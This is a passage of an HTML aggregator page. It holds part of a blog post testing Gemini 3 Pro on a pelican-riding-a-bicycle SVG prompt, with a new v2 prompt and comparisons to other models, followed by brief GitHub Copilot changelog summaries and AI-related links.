-Okay. Well, thanks everybody, members of the public for participating. Thank you for staff. Thank you to fellow council members. This meeting is now adjourned. Have a good evening.
-
-
-I&#x27;m disappointed about the timestamps, since mismatches there make it much harder to jump to the right point and confirm that the summarized transcript is an accurate representation of what was said.
-
-This took 320,087 input tokens and 7,870 output tokens, for a total cost of $1.42.
-
-And a new pelican benchmark
-
-Gemini 3 Pro has a new concept of a &quot;thinking level&quot; which can be set to low or high (and defaults to high). I tried my classic Generate an SVG of a pelican riding a bicycle prompt at both levels.
-
-Here&#x27;s low - Gemini decided to add a jaunty little hat (with a comment in the SVG that says &lt;!-- Hat (Optional Fun Detail) --&gt;):
-
-
-
-And here&#x27;s high. This is genuinely an excellent pelican, and the bicycle frame is at least the correct shape:
-
-
-
-Honestly though, my pelican benchmark is beginning to feel a little bit too basic. I decided to upgrade it. Here&#x27;s v2 of the benchmark, which I plan to use going forward:
-
-
-Generate an SVG of a California brown pelican riding a bicycle. The bicycle must have spokes and a correctly shaped bicycle frame. The pelican must have its characteristic large pouch, and there should be a clear indication of feathers. The pelican must be clearly pedaling the bicycle. The image should show the full breeding plumage of the California brown pelican.
-
-
-For reference, here&#x27;s a photo I took of a California brown pelican recently (sadly without a bicycle):
-
-
-
-Here&#x27;s Gemini 3 Pro&#x27;s attempt at high thinking level for that new prompt:
-
-
-
-And for good measure, here&#x27;s that same prompt against GPT-5.1 - which produced this dumpy little fellow:
-
-
-
-And Claude Sonnet 4.5, which didn&#x27;t do quite as well:
-
-
-
-None of the models seem to have caught on to the crucial detail that the California brown pelican is not, in fact, brown.
-Tags: google, ai, generative-ai, llms, llm, gemini, llm-pricing, pelican-riding-a-bicycle, llm-reasoning, llm-release</a>
-            </div>
-            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Gemini 3 Pro is in public preview for GitHub Copilot
-              <span class="post-metadata">(5 min | 1456 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-11-18-gemini-3-pro-is-in-public-preview-for-github-copilot>Gemini 3 Pro, Google’s latest frontier model, is now rolling out and will be available in GitHub Copilot Pro, Pro+ Business, and Enterprise subscriptions. Rollout will be gradual. Check back…
-The post Gemini 3 Pro is in public preview for GitHub Copilot appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2025 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Auto model selection for Copilot in JetBrains IDEs, Xcode, and Eclipse in public preview
-              <span class="post-metadata">(5 min | 1634 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-11-18-auto-model-selection-for-copilot-in-jetbrains-ides-xcode-and-eclipse-in-public-preview>GitHub Copilot in JetBrains IDEs, Xcode, and Eclipse now includes an Auto option that selects the model on your behalf. Choose Auto from the model picker in Copilot Chat. This…
-The post Auto model selection for Copilot in JetBrains IDEs, Xcode, and Eclipse in public preview appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2025 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Enhanced MCP OAuth support for GitHub Copilot in JetBrains, Eclipse, and Xcode
-              <span class="post-metadata">(5 min | 1503 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-11-18-enhanced-mcp-oauth-support-for-github-copilot-in-jetbrains-eclipse-and-xcode>We’ve introduced enhanced authentication capabilities in GitHub Copilot plugins for JetBrains, Eclipse, and Xcode to support more third-party OAuth providers with a secure and flexible approach using Dynamic Client Registration…
-The post Enhanced MCP OAuth support for GitHub Copilot in JetBrains, Eclipse, and Xcode appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2025 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Custom agents available in GitHub Copilot for JetBrains, Eclipse, and Xcode now in public preview
-              <span class="post-metadata">(5 min | 1555 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-11-18-custom-agents-available-in-github-copilot-for-jetbrains-eclipse-and-xcode-now-in-public-preview>Custom agents are now in public preview for JetBrains IDEs, Eclipse, and Xcode, allowing you to package reusable expertise, guardrails, and tool access into AI agents tailored to your project…
-The post Custom agents available in GitHub Copilot for JetBrains, Eclipse, and Xcode now in public preview appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2025 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Unified code-to-cloud artifact risk visibility with Microsoft Defender for Cloud now in public preview
-              <span class="post-metadata">(6 min | 1856 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-11-18-unified-code-to-cloud-artifact-risk-visibility-with-microsoft-defender-for-cloud-now-in-public-preview>GitHub now makes it easier for teams to track, prioritize, and remediate security risks that matter by connecting code, build artifacts, and production context. Here’s what’s shipped and how you…
-The post Unified code-to-cloud artifact risk visibility with Microsoft Defender for Cloud now in public preview appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2025 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Isolated Subagents for JetBrains, Eclipse, and Xcode now in public preview
-              <span class="post-metadata">(6 min | 1739 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-11-18-isolated-subagents-for-jetbrains-eclipse-and-xcode-now-in-public-preview>We’re excited to share that isolated subagents are now in public preview across JetBrains IDEs, Eclipse, and Xcode! Empowered by isolated context, subagents let you delegate focused tasks to autonomous…
-The post Isolated Subagents for JetBrains, Eclipse, and Xcode now in public preview appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2025 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              GitHub Copilot Next Edit Suggestions (NES) now in public preview for Xcode and Eclipse
-              <span class="post-metadata">(5 min | 1570 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-11-18-github-copilot-next-edit-suggestions-nes-now-in-public-preview-for-xcode-and-eclipse>GitHub Copilot Next Edit Suggestions (NES) is now available in public preview for Xcode and Eclipse. This new feature helps developers move faster by suggesting the next logical edit based…
-The post GitHub Copilot Next Edit Suggestions (NES) now in public preview for Xcode and Eclipse appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2025 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              GitHub Copilot coding agent for Eclipse now in public preview
-              <span class="post-metadata">(7 min | 2090 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-11-18-github-copilot-coding-agent-for-eclipse-now-in-public-preview>GitHub Copilot coding agent is now available in public preview for Eclipse. This release brings Copilot directly into native Eclipse workflows. What’s new Delegate from Eclipse: Describe a task in…
-The post GitHub Copilot coding agent for Eclipse now in public preview appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2025 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Plan mode in GitHub Copilot now in public preview in JetBrains, Eclipse, and Xcode
-              <span class="post-metadata">(6 min | 1757 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2025-11-18-plan-mode-in-github-copilot-now-in-public-preview-in-jetbrains-eclipse-and-xcode>We’re excited to announce that plan mode in GitHub Copilot is now available in public preview for JetBrains IDEs, Eclipse, and Xcode. Here’s what you need to know about this…
-The post Plan mode in GitHub Copilot now in public preview in JetBrains, Eclipse, and Xcode appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2025 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              gemini-3-pro-preview
-              <span class="post-metadata">(8 min | 2374 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://ollama.com/library/gemini-3-pro-preview>Google&#x27;s most intelligent model with SOTA reasoning and multimodal understanding, and powerful agentic and vibe coding capabilities.</a>
-            </div>
-            <!-- <p class="post-source">Ollama models</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Three Years from GPT-3 to Gemini 3
-              <span class="post-metadata">(0 min |  words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://www.oneusefulthing.org/p/three-years-from-gpt-3-to-gemini>From chatbots to agents</a>
-            </div>
-            <!-- <p class="post-source">One Useful Thing</p> -->
           </details>
       </article>
 
